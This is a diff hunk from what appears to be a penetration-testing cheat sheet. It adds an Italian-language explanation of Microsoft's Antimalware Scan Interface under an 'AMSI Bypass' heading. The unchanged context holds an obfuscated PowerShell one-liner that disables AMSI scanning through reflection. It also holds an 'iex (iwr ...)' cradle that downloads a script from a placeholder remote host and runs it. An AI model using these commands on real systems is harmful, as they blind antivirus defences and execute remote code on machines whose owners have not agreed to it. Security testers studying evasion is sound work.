@@ -61,6 +61,8 @@ iex (iwr http://xx.xx.xx.xx/<scriptname> -UseBasicParsing)
 ```
 
 ### AMSI Bypass
+### AMSI, o Antimalware Scan Interface, è un'interfaccia introdotta da Microsoft a partire da Windows 10 e Windows Server 2016. Essa consente ai programmi antivirus e ad altre soluzioni di sicurezza di integrarsi con le applicazioni in esecuzione e di effettuare la scansione dei contenuti in modo più efficace. L'AMSI può rilevare e segnalare potenziali minacce di malware alle applicazioni che la utilizzano.
+
 ```
 sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
 ```
